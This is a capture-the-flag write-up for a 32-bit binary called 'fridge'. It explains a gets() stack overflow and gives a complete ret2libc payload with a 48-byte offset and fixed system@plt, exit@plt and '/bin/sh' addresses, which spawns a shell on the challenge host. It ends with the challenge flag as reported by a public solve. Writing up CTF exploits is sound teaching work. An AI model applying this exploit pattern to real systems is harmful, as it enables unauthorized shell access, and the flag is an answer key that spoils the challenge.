# fridge

## Summary

This is a straightforward 32-bit ret2libc.

`checksec` is already enough to narrow the plan:

- no PIE, so code addresses are fixed
- no stack canary, so a stack overflow is usable
- NX is enabled, so return-to-shellcode is out and ret2libc is the clean path

## Bug

Option `2` calls `set_welcome_message()`, which reads a new welcome string with `gets()`:

```c
char s[32];
gets(s);
```

The function layout from the binary is:

- buffer at `ebp-0x2c`
- saved return address at `ebp+4`

So the overwrite distance is:

```text
0x2c + 4 = 0x30 = 48 bytes
```

## Exploit

Because the binary is not PIE, the required addresses are fixed:

- `system@plt = 0x080490a0`
- `exit@plt   = 0x080490b0`
- `"/bin/sh"  = 0x0804a09a`

That `"/bin/sh"` string is already present in `.rodata` inside the changelog text:

```text
- Fixed issue that allowed bad actors to get /bin/sh
```

So the final payload is just:

```python
payload = b"A" * 48
payload += p32(0x080490a0)  # system@plt
payload += p32(0x080490b0)  # exit@plt
payload += p32(0x0804a09a)  # "/bin/sh"
```

Then:

1. wait for the menu
2. choose option `2`
3. send the payload as the new welcome message
4. use the spawned shell to read the flag

## Files

- `solve.py` is a cleaned version of the shipped exploit script
- the challenge bundle in this workspace targets `chall.0xfun.org:32834`

## Flag

A public solve reports the remote flag as:

```text
0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}
```

Source for the reported flag: <https://hackmd.io/@t3mp0ral/Ak_M4mFjlx>
